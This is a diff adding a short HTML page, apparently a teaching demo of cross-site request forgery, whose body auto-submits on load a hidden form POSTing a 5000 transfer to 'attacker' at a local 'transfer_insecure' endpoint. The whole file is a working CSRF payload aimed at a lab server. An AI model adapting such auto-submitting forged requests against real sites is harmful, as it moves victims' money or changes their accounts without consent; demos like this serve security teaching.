@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>⚠️ CSRF Attack Demo</title>
+</head>
+<body onload="document.forms[0].submit()" style="text-align:center; margin-top:100px;">
+    <h1>🚨 Simulating CSRF Attack...</h1>
+    <form method="POST" action="http://localhost:5000/transfer_insecure">
+        <input type="hidden" name="recipient" value="attacker">
+        <input type="hidden" name="amount" value="5000">
+    </form>
+</body>
+</html>
